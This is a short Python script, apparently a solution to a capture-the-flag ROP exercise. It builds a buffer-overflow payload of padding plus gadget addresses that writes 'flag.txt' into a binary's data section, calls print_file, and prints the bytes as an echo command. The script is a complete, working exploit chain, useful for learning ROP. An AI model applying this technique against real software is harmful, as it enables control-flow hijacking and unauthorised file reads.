#!/usr/bin/python3

WORD = 4

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, WORD)
PACKS = lambda s: bytes(s + (((len(s) & ~(WORD - 1) - 1) + WORD) - len(s)) * "\x00", "utf-8")

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

DATA_SECTION = 0x0804a018
PRINT_FILE = 0x8048538
POP_EDI_EBP = 0x080485aa
MOV_EBP_AT_EDI = 0x8048543

rop = b" " * 44
rop += PACKP(POP_EDI_EBP)
rop += PACKP(DATA_SECTION) + PACKS("flag")
rop += PACKP(MOV_EBP_AT_EDI)
rop += PACKP(POP_EDI_EBP)
rop += PACKP(DATA_SECTION + 4) + PACKS(".txt")
rop += PACKP(MOV_EBP_AT_EDI)
rop += PACKP(PRINT_FILE)
rop += PACKP(DATA_SECTION)

echo(rop)

